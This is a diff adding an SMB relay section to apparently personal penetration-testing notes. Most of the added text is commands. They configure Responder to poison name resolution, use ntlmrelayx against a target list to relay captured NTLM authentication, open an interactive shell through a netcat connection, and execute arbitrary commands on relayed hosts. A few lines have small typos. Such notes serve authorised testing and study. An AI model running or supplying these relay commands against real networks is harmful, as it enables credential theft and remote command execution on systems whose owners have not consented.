@@ -10,6 +10,32 @@ hashcat -a 0 -m 5600 <hashfile> <wordlist>
 ```
 ### SMB Relay
 SMB Signing must be disabled or not enforced
+
+Disable SMB and HTTP in responder
+```bash
+sudo vim /etc/responder/responder.conf
+```
+Turn on responder
+```bash
+sudo Responder -I <iface> -dwp
+```
+Create a targets.txt file (List of all relay attack targets.
+
+Capture hashes
+```bash
+sudo ntlmrelayx.py -tf targets.txt -smb2support
+```
+Open a shell
+```bash
+nc 127.0.0.7 11000 #Open a netcat listener
+
+sudo ntlmrelayx.py -tf targets.txt -smb2support -i
+```
+Run a command
+```bash
+sudo ntlmrelayx.py -tf targets.txt -smb2support -c "<command"
+```
+
 ### IPv6 DNS TakeOver
 
 ### Passback Attacks
